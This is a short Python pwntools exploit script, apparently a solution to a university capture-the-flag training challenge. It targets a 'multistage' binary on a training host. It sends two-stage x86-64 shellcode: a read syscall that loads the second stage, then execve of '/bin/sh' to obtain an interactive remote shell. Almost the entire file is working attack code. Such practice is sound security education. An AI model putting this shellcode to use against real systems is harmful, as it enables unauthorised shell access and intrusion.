#! /usr/bin/python3
import sys
import pwn
import time
#pwn.context.log_level='DEBUG'

# per runnare il processo in virtual machine e interagirci da fuori:
# ssh= ssh("username","ip")
# r= ssh.process("./multistage")                    multistage name of the process

pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./multistage")
#pwn.gdb.attach(r, '''
#b * 0x0040123f
#c
#''' )
#r.interactive()

shellcode1= '''
mov rsi, rax
xor rax, rax
xor rdi, rdi
mov rdx, 0xff
syscall
'''

shellcode2='''
mov rax, 0x3b
mov rdi, rsi
add rdi, 0x2a
xor rsi, rsi
xor rdx, rdx
syscall
'''
payload=b'\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00'

pwn.context.arch="amd64"
fragment1=pwn.asm(shellcode1)

#input("waiting")
#print(len(pwn.asm(shellcode1)))
#print(pwn.asm(shellcode1))
#print(20+len(pwn.asm(shellcode2)))

#r.send(pwn.asm(shellcode1)+(20-len(pwn.asm(shellcode1)))*b'\x41'+payload+pwn.asm(shellcode2)+payload)
r = pwn.remote("bin.training.offdef.it",2003)
#r.interactive()
#r.recv()
r.send(fragment1+(20-len(fragment1)) * b'\x90')
input("wait")
r.send(len(fragment1)*b'\x90'+pwn.asm(shellcode2)+payload)
r.interactive()

#sys.stdout.buffer.write(pwn.asm(shellcode1)+(20-len(pwn.asm(shellcode1)))*b'\x41'+payload+pwn.asm(shellcode2))
#input("wait")
#sys.stdout.buffer.write(payload+pwn.asm(shellcode2))
